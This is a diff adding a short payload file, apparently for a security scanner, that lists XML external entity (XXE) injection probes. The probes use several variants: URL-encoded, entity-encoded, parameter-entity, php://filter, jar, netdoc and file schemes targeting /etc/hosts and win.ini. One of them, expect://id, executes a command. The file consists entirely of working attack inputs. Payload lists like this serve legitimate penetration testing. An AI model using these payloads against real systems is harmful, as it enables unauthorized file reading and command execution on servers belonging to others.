@@ -1,0 +1,10 @@
+# XXE encoded and parser variation probes
+%3C!DOCTYPE%20x%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhosts%22%3E%5D%3E%3Cx%3E%26xxe%3B%3C%2Fx%3E
+&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;
+<!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/hosts">%p;]><x/>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file://localhost/etc/hosts">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "jar:file:///tmp/a.jar!/x">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "netdoc:///etc/hosts">]><x>&xxe;</x>
